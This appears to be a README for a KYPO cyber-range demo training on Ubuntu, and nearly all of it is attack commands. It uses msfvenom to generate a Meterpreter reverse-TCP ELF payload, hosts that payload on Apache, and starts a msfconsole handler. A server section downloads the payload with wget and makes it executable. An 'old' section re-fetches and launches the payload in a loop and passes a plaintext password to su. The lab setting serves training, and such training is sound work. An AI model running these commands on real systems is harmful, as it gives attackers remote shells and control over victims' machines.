# kypo-crp-demo-training-ubuntu

USE MSFVENOM

---

server
------

wget http://192.168.30.5/shell-x64.elf

chmod +x shell-x64.elf

---

client
------

(Stageless payload)

sudo msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST= LPORT=6996 -f elf -o /var/www/html/shell-x64.elf

sudo service apache2 start

msfconsole

use exploit/multi/handler

set PAYLOAD linux/x64/meterpreter_reverse_tcp

set LPORT 6996

set LHOST 

exploit

---

old

---

if ! pidof -x /home/server/shell-x64.elf; then sudo /home/server/shell-x64.elf; fi

if [ ! -s /home/server/shell-x64.elf ]; then wget -O /home/server/shell-x64.elf http:///shell-x64.elf; fi

if [ -s /home/server/shell-x64.elf ]; then chmod +x /home/server/shell-x64.elf; fi

echo password | su -c whoami server

wget -O /home/server/shell-x64.elf http:///shell-x64.elf && chmod +x /home/server/shell-x64.elf && /home/server/shell-x64.elf
